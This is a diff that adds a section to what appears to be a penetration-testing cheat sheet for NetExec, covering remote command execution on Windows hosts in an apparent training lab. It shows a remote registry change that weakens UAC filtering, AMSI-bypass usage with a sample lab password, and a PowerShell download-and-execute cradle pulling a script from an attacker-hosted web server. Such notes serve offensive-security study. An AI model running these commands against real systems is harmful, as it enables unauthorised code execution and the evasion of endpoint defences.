@@ -353,7 +353,36 @@ nxc winrm $FQDN -u [user] -p [pass] -X 'Get-ADServiceAccount -Filter * -Properti
 ```bash
 nxc ldap $FQDN -u [user] -p [pass] --gmsa
 ```
-### Command Execution
+## Command Execution
+* Enumeration
+> Need to check for the presence of UAC before attempt to execute commands as local admin. By default, only RID 500 can execute commands. Either must be set to `1` to allow command execution as a different member of the administrators group. `LocalAccountTokenFilterPolicy` only applies to local accounts. 
+```cmd
+# The 2 keys controlling access through UAC
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken
+```
+* Changing the registry(LocalAccountTokenFilterPolicy)
+```bash
+nxc smb [$IP] -u [Admin User] -p [password] --local-auth -x 'reg add HKLM\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\POLICIES\SYSTEM /V LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f'
+```
+#### Command Execution with SMB
+> Command execution attempts the following 4 methods in this order `wmiexec -> atexec -> smbexec -> mmcexec`. You can force using the `--exec-method` flag.  
+> Alternatively, you can execute cmd shell commands with `-x`, or powershell commands with `-X`. `-X` will by default, run an AMSI bypass, Obfuscate the payload, and execute the payload.  
+##### Runnign a Custom AMSI Bypass
+> You can specify an AMSI bypass using the `--amsi-bypass` flag.
+```bash
+# Custom amsi bypass example
+nxc smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -X '$PSVersionTable' --amsi-bypass shantanukhande-amsi.ps1
+```
+* You'll need to create and host the bypass.
+```bash
+# Create the script:
+echo "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.33/shantanukhande-amsi.ps1');" > amsibypass.txt
+
+# Throw up a quick web host to provide the script
+python3 -m http.server 80
+```
+> Remember, the script *executes on the victim machine*. That's why we need the hosting.  
 
 
 ## Remote Shell
